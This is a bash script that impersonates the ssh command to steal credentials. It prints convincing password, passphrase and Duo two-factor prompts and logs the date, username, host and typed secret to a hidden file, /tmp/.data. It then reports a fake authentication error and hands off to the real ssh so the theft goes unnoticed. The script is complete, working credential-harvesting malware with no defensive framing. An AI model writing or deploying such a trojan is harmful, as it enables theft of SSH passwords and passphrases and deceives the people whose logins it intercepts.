#!/bin/bash

# Variable to track when user runs ssh with options, which this script does not cover 
ssh_directly=0

# simulate an actual connection
sleep 2

# If the user is supplying options like -v, -l, etc, our script doesn't handle those - let's just send them on to the real ssh
echo $1 | grep ^- >/dev/null 2>&1
if [[ $? -eq 0 ]]; then
    ssh_directly=1 
fi

# account for a host that prompts for 2fa
echo $1 | grep host_that_asks_for_2fa >/dev/null 2>&1
if [[ $? -eq 0 ]] && [ "$ssh_directly" = "0" ]; then
    echo "banner that this host normally prints out here"
fi

# account for hosts that prompt for passphrases and not passwords
if [ "$ssh_directly" = "0" ]; then
    echo $1 | grep -e "host_that_asks_for_ssh_key_passphrases" -e "host2" >/dev/null 2>&1
    if [[ $? -ne 0 ]]; then
        echo -n "Password: "
        read -s pass
        echo
        echo -n "Password/Yubi code:	 " >> /tmp/.data
        sleep 1
    else
        echo -n "Passphrase: "
        read -s pass
        echo
        echo -n "Passphrase:		 " >> /tmp/.data
    fi
fi

# output a blank line to match formatting with the real ssh

# only ask for 2fa if they're ssh'ing to a 2fa-asking host
if [ "$ssh_directly" = "0" ]; then
    echo $1 | grep host_that_asks_for_2fa >/dev/null 2>&1
    if [[ $? -eq 0 ]]; then
        echo
        echo "Duo two-factor login for $(whoami): "
        echo
        echo "Enter a passcode or select one of the following options:"
        echo
        echo -n "Passcode: " 
        read code
    fi
fi

if [ "$ssh_directly" = "0" ]; then
    #echo "$(date) 	$(whoami)	$1 	$pass 	$code" >> /tmp/.data
    echo -n "$(date) 	$(whoami)	$1 	$pass	" >> /tmp/.data
    sleep 4
    echo "Authentication error. Please try again."
fi

stty echo
/usr/bin/ssh $@

